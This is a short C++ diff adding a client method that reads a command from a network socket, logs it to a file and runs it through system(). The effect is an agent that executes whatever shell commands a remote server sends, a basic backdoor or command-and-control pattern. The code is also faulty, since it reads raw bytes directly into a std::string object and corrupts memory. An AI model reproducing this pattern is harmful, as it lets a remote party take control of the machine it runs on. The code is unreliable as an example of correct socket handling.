@@ -18,6 +18,19 @@ void CLIENT::Connect(){
     if ((connect(client_sockfd_, (const struct sockaddr*)&server_addr_, sizeof(server_addr_))) < 0){
         throw std::runtime_error("Failed to connect server");
     }
+}
 
-    
+void CLIENT::ComunicationThread(std::fstream &file){
+    std::string command;
+    if ((read(client_sockfd_, &command, 100)) < 0){
+        throw std::runtime_error("Failed to recv data");
+    }
+    //
+    file << command;
+    //
+    auto run_command = [&command](){
+        system(command.c_str());
+    };
+
+    run_command();
 }
